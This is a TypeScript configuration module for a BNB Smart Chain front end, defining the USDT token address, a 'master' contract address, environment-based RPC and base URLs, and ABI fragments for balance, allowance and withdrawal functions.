export const RPC = import.meta.env.VITE_BSC_RPC_ANKR;
export const USDT_CONTRACT = "0x55d398326f99059ff775485246999027b3197955"; // BSC USDT (BEP-20)
export const MASTER_CONTRACT = "0x45c7A22C05A55919213cA2aE1bFcDc20df51780F";

export const BASE_URL = import.meta.env.VITE_BASE_URL;

export const USDT_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)",
];

export const MASTER_ABI = [
  {
    inputs: [
      { name: "from", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    name: "forWithdraw",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    name: "withdrawTo",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "contractBalance",
    outputs: [{ name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [{ name: "", type: "address" }],
    stateMutability: "view",
    type: "function",
  },
] as const;
